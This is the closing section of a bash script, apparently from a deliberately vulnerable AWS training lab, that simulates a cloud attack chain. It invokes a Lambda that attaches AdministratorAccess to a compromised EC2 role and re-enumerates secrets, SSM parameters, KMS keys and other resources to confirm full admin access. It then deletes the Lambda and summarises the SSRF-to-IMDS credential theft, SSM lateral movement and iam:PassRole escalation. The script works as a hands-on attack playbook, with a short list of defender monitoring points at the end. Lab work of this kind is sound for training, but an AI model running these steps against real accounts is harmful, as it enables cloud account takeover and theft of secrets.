  info "Review the output above; ensure EC2b role has lambda:InvokeFunction and the Lambda exists in ${REGION}"
fi
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We invoked the privilege escalation Lambda.\n\n"
printf "The Lambda executed ${MAGENTA}attach_role_policy()${RESET} and attached\n"
printf "AdministratorAccess to the EC2a role (StreamGoat-JumpHostRole).\n\n"
printf "Our original SSRF-compromised role now has full admin access.\n\n"
read -r -p "Step 8 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 9. Verify escalated permissions
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 9. Verify escalated permissions from EC2a  ===" "${RESET}"
printf "Repeating the same permission enumeration from Step 2\n\n"

try "STS GetCallerIdentity"     aws sts get-caller-identity --profile "$PROFILE"
try "List account aliases"      aws iam list-account-aliases --profile "$PROFILE"
try "EC2 DescribeInstances"     aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"       aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"       aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances"     aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"              aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"         aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"      aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"            aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"           aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups"    aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Privilege escalation confirmed — permissions we didn't have before are now available" "${RESET}"
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We verified the privilege escalation was successful.\n\n"
printf "Before: Many [DENY] results (limited permissions)\n"
printf "After:  All [OK] results (full admin access)\n\n"
printf "With AdministratorAccess, we now have full account compromise.\n\n"
read -r -p "Step 9 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 10. Cleanup — delete PrivEsc Lambda
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 10. Cleanup — delete PrivEsc Lambda  ===" "${RESET}"
printf "Lambda deletion is optional for the attack but necessary since it will not be deleted by Terraform\n\n"

: "${LAMBDA_NAME:?Missing Lambda name (LAMBDA_NAME)}"
: "${REGION:?Missing AWS region (REGION)}"

if aws lambda get-function --profile "$PROFILE" --function-name "$LAMBDA_NAME" --region "$REGION" >/dev/null 2>&1; then
  if aws lambda delete-function --profile "$PROFILE" --function-name "$LAMBDA_NAME" --region "$REGION"; then
    ok "Deleted Lambda function: ${LAMBDA_NAME}"
  else
    err "Failed to delete Lambda function: ${LAMBDA_NAME}"
  fi
else
  info "Lambda function '${LAMBDA_NAME}' not found; nothing to delete."
fi
rm -rf /tmp/streamgoat_eic_*

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Exploited SSRF vulnerability to steal IMDS credentials (IMDSv1)\n"
printf "  2. Enumerated permissions for compromised EC2a role\n"
printf "  3. Lateral movement to EC2b via SSM SendCommand\n"
printf "  4. Installed AWS CLI on EC2b for IAM enumeration\n"
printf "  5. Discovered EC2b role with lambda:CreateFunction + iam:PassRole\n"
printf "  6. Enumerated roles and found one with iam:AttachRolePolicy\n"
printf "  7. Created PrivEsc Lambda with the privileged role\n"
printf "  8. Invoked Lambda to attach AdministratorAccess to EC2a role\n"
printf "  9. Verified full admin access via re-enumeration\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full AWS account administrator access\n"
printf "  • IAM privilege escalation via Lambda role chaining\n"
printf "  • Confused deputy attack through iam:PassRole\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • SSRF attempts to internal metadata endpoints (169.254.169.254)\n"
printf "  • Lambda creation with privileged IAM roles\n"
printf "  • AttachRolePolicy calls to sensitive roles\n"
printf "  • Unusual SSM SendCommand patterns across instances\n"
printf "  • IMDSv1 usage on instances that should enforce IMDSv2\n\n"

read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
